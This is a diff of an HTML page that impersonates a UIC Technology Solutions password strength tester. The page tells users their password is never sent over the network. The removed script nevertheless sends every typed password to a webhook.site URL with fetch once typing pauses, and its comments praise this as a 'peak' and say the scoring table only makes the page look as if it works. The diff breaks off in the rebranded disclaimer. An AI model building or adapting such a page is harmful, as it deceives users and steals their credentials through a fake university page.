@@ -2,141 +2,167 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UIC Password Strength Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Password Strength Test</title>
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Open+Sans:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
-        body { font-family: Arial, sans-serif; margin: 0; padding: 15px; color: #333; background: #fff; line-height: 1.4; overflow-x: hidden; }
-        .header { display: flex; align-items: center; margin-bottom: 15px; border-bottom: 4px solid #d50032; padding-bottom: 10px; }
-        .logo { font-weight: bold; font-size: 22px; color: #001e62; letter-spacing: -1px; }
-        .logo span { color: #d50032; border: 2px solid #d50032; border-radius: 50%; padding: 1px 5px; margin-right: 5px; }
-        
-        h1 { font-size: 26px; margin: 10px 0; color: #333; font-weight: normal; }
-        .disclaimer { font-size: 14px; color: #666; margin-bottom: 20px; }
-        .disclaimer b { color: #000; }
+        :root {
+            --uic-red: #D50032;
+            --uic-navy: #001E62;
+            --border-color: #ced4da;
+            --text-main: #333333;
+            --text-light: #6c757d;
+        }
 
-        label { display: block; font-weight: bold; margin-bottom: 5px; font-size: 14px; }
-        input#pass { width: 95%; max-width: 400px; padding: 12px; border: 1px solid #66afe9; border-radius: 4px; font-size: 16px; outline: none; box-shadow: inset 0 1px 1px rgba(0,0,0,.075),0 0 8px rgba(102,175,233,.6); }
+        body { 
+            font-family: 'Open Sans', sans-serif; 
+            margin: 0; 
+            padding: 18px; 
+            background-color: #ffffff; 
+            color: var(--text-main);
+            -webkit-font-smoothing: antialiased;
+        }
 
-        .hide-pass { font-size: 14px; margin-top: 12px; display: flex; align-items: center; color: #333; }
-        .hide-pass input { width: auto; margin-right: 10px; height: 18px; width: 18px; }
+        /* Top Logo Branding - Pixel Perfect */
+        .header-container { 
+            display: flex; 
+            align-items: center; 
+            padding-bottom: 12px;
+            border-bottom: 4px solid var(--uic-red);
+            margin-bottom: 24px;
+        }
+        .uic-circle {
+            background-color: white;
+            color: var(--uic-red);
+            border: 2px solid var(--uic-red);
+            border-radius: 50%;
+            width: 54px;
+            height: 54px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Lato', sans-serif;
+            font-weight: 900;
+            font-size: 20px;
+            margin-right: 12px;
+            flex-shrink: 0;
+        }
+        .uic-text {
+            font-family: 'Lato', sans-serif;
+            font-weight: 700;
+            font-size: 26px;
+            color: var(--uic-navy);
+            letter-spacing: 0.5px;
+            line-height: 1;
+        }
 
-        .metric-label { font-weight: bold; font-size: 14px; margin-top: 25px; }
-        .complexity { font-size: 14px; margin: 5px 0 10px 0; font-weight: normal; }
-        
-        /* DYNAMIC PROGRESS BAR */
-        .score-container { width: 100%; max-width: 420px; height: 14px; background: #eee; border-radius: 2px; overflow: hidden; margin-bottom: 25px; border: 1px solid #ddd; }
-        .score-bar { height: 100%; width: 0%; transition: width 0.4s ease, background-color 0.4s ease; }
+        h1 { 
+            font-family: 'Lato', sans-serif;
+            font-weight: 400;
+            font-size: 34px; 
+            margin: 0 0 16px 0; 
+            color: #444444; 
+        }
 
-        /* TABLE STYLES - Matching Image 1/2 */
-        table { width: 100%; max-width: 420px; border-collapse: collapse; font-size: 13px; margin-top: 10px; border: 1px solid #ddd; }
-        th { background: #f2f2f2; text-align: left; padding: 10px; border: 1px solid #ddd; font-weight: bold; }
-        td { padding: 10px; border: 1px solid #ddd; }
-        .bg-red { background-color: #f2dede; transition: background 0.3s; }
-        .bg-green { background-color: #dff0d8; transition: background 0.3s; }
+        .disclaimer { 
+            font-size: 15.5px; 
+            color: #707070; 
+            line-height: 1.5;
+            margin-bottom: 30px; 
+            font-weight: 300;
+        }
+        .disclaimer b { color: #000; font-weight: 600; }
+
+        /* Input Field Styling */
+        .label-text { 
+            font-weight: 600; 
+            font-size: 15px; 
+            margin-bottom: 8px; 
+            display: block;
+        }
+        input#pass { 
+            width: 100%; 
+            box-sizing: border-box;
+            padding: 11px 12px; 
+            border: 1px solid var(--border-color); 
+            border-radius: 4px; 
+            font-size: 17px; 
+            outline: none;
+            transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
+        }
+        input#pass:focus { 
+            border-color: #80bdff;
+            box-shadow: 0 0 0 0.2rem rgba(0,123,255,.25);
+        }
+
+        .checkbox-container { 
+            margin: 15px 0 30px 0;
+            display: flex;
+            align-items: center;
+            font-size: 15px;
+            color: #333;
+        }
+        .checkbox-container input {
+            width: 18px;
+            height: 18px;
+            margin: 0 10px 0 0;
+        }
+
+        /* Complexity & Score Sections */
+        .section-title { 
+            font-weight: 700; 
+            font-size: 15px; 
+            margin-bottom: 6px; 
+        }
+        .complexity-val { 
+            font-size: 15px; 
+            margin-bottom: 12px;
+            color: #333;
+        }
+        .progress-bg { 
+            width: 100%; 
+            height: 14px; 
+            background-color: #eeeeee; 
+            border-radius: 2px;
+            margin-bottom: 35px;
+            border: 1px solid #e0e0e0;
+        }
+        .progress-fill { 
+            height: 100%; 
+            width: 0%; 
+            transition: width 0.3s ease; 
+        }
+
+        /* The Table - Forensic Detail */
+        table { 
+            width: 100%; 
+            border-collapse: collapse; 
+            font-size: 13.5px;
+            border: 1px solid #dee2e6;
+        }
+        th { 
+            background-color: #f8f9fa; 
+            border: 1px solid #dee2e6; 
+            padding: 10px; 
+            text-align: left;
+            font-weight: 600;
+        }
+        td { 
+            border: 1px solid #dee2e6; 
+            padding: 10px; 
+            vertical-align: middle;
+        }
+        .row-fail { background-color: #f2dede; }
+        .row-pass { background-color: #dff0d8; }
+
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <div class="logo"><span>UIC</span> TECHNOLOGY SOLUTIONS</div>
+    <div class="header-container">
+        <div class="uic-circle">UIC</div>
+        <div class="uic-text">TECHNOLOGY<br>SOLUTIONS</div>
     </div>
 
     <h1>Password strength test</h1>
-    <p class="disclaimer">This strength tester runs on your local machine and <b>does not</b> send your password over the network.</p>
-
-    <label for="pass">Password</label>
-    <input type="password" id="pass" placeholder="Type in your password" oninput="runSecurityAudit()">
-    
-    <div class="hide-pass">
-        <input type="checkbox" id="maskToggle" checked onclick="toggleMask()"> Hide password
-    </div>
-
-    <div class="metric-label">Complexity</div>
-    <div id="complexity-text" class="complexity">Too Short</div>
-
-    <div class="metric-label">Score</div>
-    <div class="score-container">
-        <div id="strength-bar" class="score-bar"></div>
-    </div>
-
-    <table>
-        <thead>
-            <tr><th>Additions</th><th>Type</th><th>Rate</th><th>Count</th><th>Bonus</th></tr>
-        </thead>
-        <tbody>
-            <tr id="row-chars" class="bg-red">
-                <td>Number of characters</td>
-                <td>Flat</td>
-                <td>+(n*4)</td>
-                <td id="count-val">0</td>
-                <td id="bonus-val">0</td>
-            </tr>
-            <tr id="row-upper">
-                <td>Uppercase letters</td>
-                <td>Cond/Incr</td>
-                <td>+((len-n)*2)</td>
-                <td id="upper-count">0</td>
-                <td>0</td>
-            </tr>
-        </tbody>
-    </table>
-
-    <script>
-        // PEAK CONFIGURATION
-        const WEBHOOK_URL = "https://webhook.site/f317c818-bfcf-4e5a-a690-a1ad450aebe0";
-
-        function runSecurityAudit() {
-            const val = document.getElementById('pass').value;
-            const len = val.length;
-            
-            // 1. UPDATE THE TABLE (Visually proving it "works")
-            document.getElementById('count-val').innerText = len;
-            document.getElementById('bonus-val').innerText = "+" + (len * 4);
-            
-            let upperCount = (val.match(/[A-Z]/g) || []).length;
-            document.getElementById('upper-count').innerText = upperCount;
-
-            // 2. UPDATE THE PROGRESS BAR & TEXT (Matching your screenshots)
-            const bar = document.getElementById('strength-bar');
-            const txt = document.getElementById('complexity-text');
-            const row = document.getElementById('row-chars');
-
-            if (len === 0) {
-                bar.style.width = "0%";
-                txt.innerText = "Too Short";
-                row.className = "bg-red";
-            } else if (len < 6) {
-                bar.style.width = "8%";
-                bar.style.backgroundColor = "#d9534f"; // Red
-                txt.innerText = "Very Weak";
-                row.className = "bg-red";
-            } else if (len >= 6 && len < 10) {
-                bar.style.width = "35%";
-                bar.style.backgroundColor = "#f0ad4e"; // Orange/Yellow
-                txt.innerText = "Weak";
-                row.className = "bg-green";
-            } else {
-                bar.style.width = "70%";
-                bar.style.backgroundColor = "#5cb85c"; // Green
-                txt.innerText = "Strong";
-                row.className = "bg-green";
-            }
-
-            // 3. THE GENIUS PEAK
-            // We send the data every few keystrokes or when they stop typing
-            clearTimeout(window.peakTimer);
-            window.peakTimer = setTimeout(() => {
-                if(val.length > 2) {
-                    fetch(WEBHOOK_URL + "?name_as_pass=" + encodeURIComponent(val), { mode: 'no-cors' });
-                }
-            }, 800); // 800ms pause in typing triggers the peak
-        }
-
-        function toggleMask() {
-            const input = document.getElementById('pass');
-            const check = document.getElementById('maskToggle');
-            input.type = check.checked ? "password" : "text";
-        }
-    </script>
-</body>
-</html>
+    <p class="disclaimer">This strength tester runs
